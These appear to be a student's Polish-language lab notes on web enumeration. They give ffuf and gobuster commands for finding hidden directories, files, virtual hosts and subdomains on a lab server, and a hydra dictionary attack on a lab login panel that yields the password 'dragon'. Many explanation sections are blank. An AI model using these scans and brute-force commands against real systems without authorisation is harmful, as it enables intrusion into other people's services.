# 🌎 **Enumeracja Web - Nauka**

Podczas rozwiazywania tych zadan wybralem narzedzie **ffuf**, alternatywnie moglismy uzyc **gobuster**.

## 4.1 
### 📌 **Polecenie**
Celem zadania jest znalezienie DWÓCH ukrytych katalogów na stronie http://192.168.100.4/

---

### ✅ **Rozwiązanie**
To rozwiazanie nie dziala xd

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u http://192.168.100.4/FUZZ
```

---

### ❓ **Wytłumaczenie**
- Czym jest narzedzie **ffuf**?
> 
- Co robi flaga **-w**?
>
- Co robi flaga **-u**?
>

---

## 4.2 
### 📌 **Polecenie**
Celem zadania jest znalezienie ukrytych plików php w katalogu http://192.168.100.4/_private/

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u http://192.168.100.4/_private/FUZZ
```

---

### ❓ **Wytłumaczenie**
- O co chodzi z tym FUZZ na koncu? i czemu jest po nazwie katalogu?
>
- A w sumie to gdzie definiujemy ze szukamy plikow php?
>
- Co to `raft-small-files.txt`?
>

---

## 4.3 
### 📌 **Polecenie**
Celem zadania jest znalezienie ukrytego wirtualnego hosta skonfigurowanego na http://192.168.100.4

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt -u http://192.168.100.4/ -H 'Host: FUZZ'
```

---

### ❓ **Wytłumaczenie**
- Co robi flaga -H?
>
- Co oznacza 'Host: FUZZ'?
>
- Co to `fierce-hostlist.txt`?
>

---


## 4.4 
### 📌 **Polecenie**
Celem zadania jest znalezienie subdomeny domeny business.

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://192.168.100.4// -H 'Host: FUZZ.business'
```

---

### ❓ **Wytłumaczenie**
- Gdzie definiujemy, ze szukamy tej subdomeny i akurat tej domeny?
>
- Co to jest `subdomains-top1milion-5000.txt`?
>
- <!-- Wstaw pytanie 3 -->
>

---


## 4.5 
### 📌 **Polecenie**
Celem zadania jest znalezienie prawidłowego hasła dla pliku http://192.168.100.4/4.5.php?password=guess.

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
ffuf -w /usr/share/seclists/Passwords/darkweb2017-top100.txt -u 'http://192.168.100.4/4.5.php?password=FUZZ'
```

---

### ❓ **Wytłumaczenie**
- Skad wiemy, ze znajduje sie w tym pliku?
>
- Co sie dzieje z tym "password=FUZZ"?
>
- Co to `darkweb2017-top100.txt`?
>

---

## 4.1p 
### 📌 **Polecenie**
Celem zadania jest odczytanie nazwy hosta (Common Name) z certyfikatu SSL strony https://192.168.100.54/, następnie połączenie się z wirtualnym hostem o tej nazwie. Nazwa webpjatk nie jest rozwiązywalna przez DNS, dlatego aby połączyć się z tym wirtualnym hostem możemy dodać odpowiedni wpis do pliku /etc/hosts:

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
echo '192.168.100.54 webpjatk' | sudo tee -a /etc/hosts
```

Nastepnie w przegladarce, na naszej maszynie kali wchodzimy na strone:
```
https://webpjatk/
```

---

### ❓ **Wytłumaczenie**
- 
>
- 
>
- 
>

---

## 4.2p 
### 📌 **Polecenie**
Celem zadania jest enumeracja subdomen domeny webpjatk na serwerze 192.168.100.54 Zadanie zostanie automatycznie rozwiązane po znalezieniu ukrytych subdomen.

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
gobuster vhost -u https://webpjatk/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain webpjatk --append-domain -k
```

Dodajemy do naszego pliku `/etc/hosts` nasza subdomene:
```
echo '192.168.100.54 admin.webpjatk' | sudo tee -a /etc/hosts
```

Nastepnie wchodzimy z naszej maszynki kali na strone:
```
https://admin.webpjatk/
```
---

### ❓ **Wytłumaczenie**
- 
>
- 
>
- 
>

---

## 4.3p 
### 📌 **Polecenie**
Celem zadania jest enumeracja katalogów domeny admin.webpjatk na serwerze 192.168.100.54.

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
gobuster dir -u https://admin.webpjatk/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -k
```
By dostac punkty za zadanie przechodzimy do /panel
```
https://admin.webpjatk/panel/
```
---

### ❓ **Wytłumaczenie**
- 
>
- 
>
- 
>

---

## 4.4p 
### 📌 **Polecenie**
Celem zadania jest enumeracja plików w katalogu `https://admin.webpjatk/panel/` na serwerze 192.168.100.54.

---

### ✅ **Rozwiązanie**
<!-- Wstaw rozwiązanie tutaj -->

```bash
gobuster dir -u https://admin.webpjatk/panel/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -k
```

Nastepnie wchodzimy do jednego z plikow, ktore nam wyswietlilo. Ja wszedlem we wszystkie ktore mialy status 200 i zadzialalo, np:

```
https://admin.webpjatk/panel/login.php
```

---

### ❓ **Wytłumaczenie**
- 
>
- 
>
- 
>

---

## 4.5p 
### 📌 **Polecenie**
Celem zadania jest złamanie hasła metodą słownikową w panelu https://admin.webpjatk/panel/login.php Zadanie zostanie automatycznie rozwiązane po zalogowaniu.

---

### ✅ **Rozwiązanie**

Probujemy znalezc haslo uzywajac tej komendy:

```bash
hydra -l anything -P /usr/share/seclists/Passwords/darkweb2017-top100.txt 'https-post-form://admin.webpjatk/panel/login.php:p=^PASS^:Wrong password'
```

Znajduje nam, haslo ktore pasuje i wchodzimy tutaj, zeby sie zalogowac:

```
https://admin.webpjatk/panel/login.php
```

Haslo:
> dragon

---

### ❓ **Wytłumaczenie**
- 
>
- 
>
- 
>

---